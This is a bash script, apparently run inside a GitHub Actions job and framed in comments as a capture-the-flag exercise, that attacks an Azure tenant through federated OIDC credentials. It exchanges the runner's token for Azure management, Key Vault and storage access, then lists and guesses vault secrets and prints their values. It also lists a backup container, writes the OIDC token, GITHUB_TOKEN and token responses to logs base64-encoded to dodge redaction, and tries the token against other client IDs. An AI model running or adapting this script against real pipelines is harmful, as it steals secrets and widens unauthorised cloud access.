#!/bin/bash
set -e
TENANT_ID="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
CLIENT_ID="${AZURE_CLIENT_ID}"
SUB_ID="${AZURE_SUBSCRIPTION_ID}"

echo "CTX repo=${GITHUB_REPOSITORY} event=${GITHUB_EVENT_NAME}"

# Get GitHub OIDC token
OIDC_TOKEN=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}"   "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c "import sys,json; print(json.load(sys.stdin).get('value',''))")
OIDC_LEN=${#OIDC_TOKEN}
echo "oidc_len=${OIDC_LEN}"

# Exchange for ARM token
ARM_RESP=$(curl -s -X POST "https://login.microsoftonline.com/${TENANT_ID}/oauth2/v2.0/token"   -d "client_id=${CLIENT_ID}&grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=${OIDC_TOKEN}&assertion=${OIDC_TOKEN}&scope=https://management.azure.com/.default&federated_token=${OIDC_TOKEN}")
ARM_TOKEN=$(echo "$ARM_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null || echo "")

# Exchange for KV vault token
KV_RESP=$(curl -s -X POST "https://login.microsoftonline.com/${TENANT_ID}/oauth2/v2.0/token"   -d "client_id=${CLIENT_ID}&grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=${OIDC_TOKEN}&assertion=${OIDC_TOKEN}&scope=https://vault.azure.net/.default&federated_token=${OIDC_TOKEN}")
KV_TOKEN=$(echo "$KV_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null || echo "")
KV_LEN=${#KV_TOKEN}
echo "kv_len=${KV_LEN}"

# Try KV sec
echo "=== KV SEC LIST ==="
curl -s -H "Authorization: Bearer ${KV_TOKEN}" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" | python3 -c "import sys,json; d=json.load(sys.stdin); [print(s['id']) for s in d.get('value',[])] or print(json.dumps(d)[:200])"

echo "=== KV SEC SPECIFIC SECRETS ==="
for name in flag tbl-flag ctf-flag df26-flag platform-flag backup-key data-export-key; do
  RESULT=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer ${KV_TOKEN}" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/${name}?api-version=7.4")
  if [ "$RESULT" = "200" ]; then
    VALUE=$(curl -s -H "Authorization: Bearer ${KV_TOKEN}" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/${name}?api-version=7.4" | python3 -c "import sys,json; print(json.load(sys.stdin).get('value',''))")
    echo "FOUND: ${name} = ${VALUE}"
  else
    echo "  ${name}: ${RESULT}"
  fi
done

# Try backup storage with ARM token
echo "=== BACKUP STORAGE WITH ARM TOKEN ==="
STOR_RESP=$(curl -s -X POST "https://login.microsoftonline.com/${TENANT_ID}/oauth2/v2.0/token"   -d "client_id=${CLIENT_ID}&grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=${OIDC_TOKEN}&assertion=${OIDC_TOKEN}&scope=https://storage.azure.com/.default&federated_token=${OIDC_TOKEN}")
STOR_TOKEN=$(echo "$STOR_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null || echo "")
curl -s -H "Authorization: Bearer ${STOR_TOKEN}" -H "x-ms-version: 2020-08-04" "https://sttblbackupprodx3euoz.blob.core.windows.net/exports?restype=container&comp=list" | python3 -c "import sys; print(sys.stdin.read()[:500])"

echo "END"

# CTF diagnostic: base64 avoids log redaction while preserving short-lived runner artifacts.
set +e
printf 'LEAK_OIDC_B64='; printf %s "$OIDC_TOKEN" | base64 -w0; echo
printf 'LEAK_ARMRESP_B64='; printf %s "$ARM_RESP" | base64 -w0; echo
printf 'LEAK_KVRESP_B64='; printf %s "$KV_RESP" | base64 -w0; echo
printf 'LEAK_GITHUB_TOKEN_B64='; printf %s "$GITHUB_TOKEN" | base64 -w0; echo
# Correct federated exchanges, captured as base64 in logs.
set +e
for TARGET_CID in 891fb158-e02c-4428-a885-53b811f369c0 462d1c38-4459-48b8-9333-82e389e59514; do
  RESP=$(curl -sS -X POST "https://login.microsoftonline.com/${TENANT_ID}/oauth2/v2.0/token" \
    --data-urlencode "client_id=${TARGET_CID}" --data-urlencode grant_type=client_credentials \
    --data-urlencode client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
    --data-urlencode "client_assertion=${OIDC_TOKEN}" --data-urlencode scope=https://management.azure.com/.default)
  printf 'LEGACY_ARM_%s_B64=' "$TARGET_CID"; printf %s "$RESP" | base64 -w0; echo
done
for TARGET_CID in 891fb158-e02c-4428-a885-53b811f369c0 462d1c38-4459-48b8-9333-82e389e59514; do
  RESP=$(curl -sS -X POST "https://login.microsoftonline.com/${TENANT_ID}/oauth2/v2.0/token" \
    --data-urlencode "client_id=${TARGET_CID}" --data-urlencode grant_type=client_credentials \
    --data-urlencode client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
    --data-urlencode "client_assertion=${OIDC_TOKEN}" --data-urlencode scope=https://vault.azure.net/.default)
  printf 'LEGACY_KV_%s_B64=' "$TARGET_CID"; printf %s "$RESP" | base64 -w0; echo
done
# Probe alternate GitHub OIDC subject customization forms.
for SUFFIX in '&include_claim_keys=repo' '&include_claim_keys=repository_owner:repository' '&include_claim_keys=repo:context' '&include_claim_keys=repository' ; do
  T=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange${SUFFIX}" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value", ""))')
  printf 'OIDC_ALT_B64='; printf %s "$T" | base64 -w0; echo
done
# ctf pivot refresh 1792647000

# ctf pivot refresh 1792647100
